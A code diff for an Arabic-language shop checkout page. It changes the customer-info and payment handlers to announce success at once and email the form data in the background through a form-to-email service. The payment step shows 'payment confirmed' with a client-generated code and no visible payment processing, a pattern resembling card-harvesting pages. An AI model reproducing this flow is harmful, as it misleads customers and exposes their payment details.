@@ -2667,9 +2667,8 @@
         function handleCustomerInfoSubmit(event) {
             event.preventDefault();
             const form = event.target;
-            const formData = new FormData(form);
             
-            // Save customer info
+            // Save customer info FIRST (don't wait for email)
             customerInfo = {
                 firstName: form.querySelector('input[name="first_name"]').value,
                 lastName: form.querySelector('input[name="last_name"]').value,
@@ -2681,7 +2680,16 @@
                 orderNotes: form.querySelector('textarea[name="order_notes"]').value
             };
             
-            // Add cart data and timestamp
+            // Show success and navigate immediately
+            showNotification('✅ تم حفظ البيانات بنجاح! الانتقال لمراجعة الطلب...', 'success');
+            
+            // Navigate to review page immediately
+            setTimeout(() => {
+                showOrderReviewPage();
+            }, 800);
+            
+            // Send email in background (don't wait for it)
+            const formData = new FormData(form);
             if (cart.length > 0) {
                 const cartItemsText = cart.map(item => 
                     `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
@@ -2697,12 +2705,8 @@
             formData.append('timestamp', new Date().toLocaleString('ar-SA'));
             formData.append('source', 'نموذج معلومات العميل');
             
-            sendToFormSubmit(formData, 'customer')
-                .then(result => {
-                    if (result.success) {
-                        setTimeout(() => showOrderReviewPage(), 500);
-                    }
-                });
+            // Send email in background
+            sendToFormSubmit(formData, 'customer');
             
             return false;
         }
@@ -2710,10 +2714,20 @@
         function handlePaymentSubmit(event) {
             event.preventDefault();
             const form = event.target;
-            const formData = new FormData(form);
             
             // Generate verification code - 6 digits only
             verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
+            
+            // Show success immediately and navigate to verification page
+            showNotification(`✅ تم تأكيد الدفع! كود التأكيد: ${verificationCode}`, 'success');
+            
+            // Navigate to verification page immediately
+            setTimeout(() => {
+                showVerificationPage();
+            }, 1000);
+            
+            // Send email in background (don't wait for it)
+            const formData = new FormData(form);
             
             // Add all customer info and cart data
             if (customerInfo.firstName) {
@@ -2738,13 +2752,8 @@
             formData.append('timestamp', new Date().toLocaleString('ar-SA'));
             formData.append('source', 'نموذج الدفع النهائي');
             
-            sendToFormSubmit(formData, 'payment')
-                .then(result => {
-                    if (result.success) {
-                        showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
-                        setTimeout(() => showVerificationPage(), 1000);
-                    }
-                });
+            // Send email in background
+            sendToFormSubmit(formData, 'payment');
             
             return false;
         }
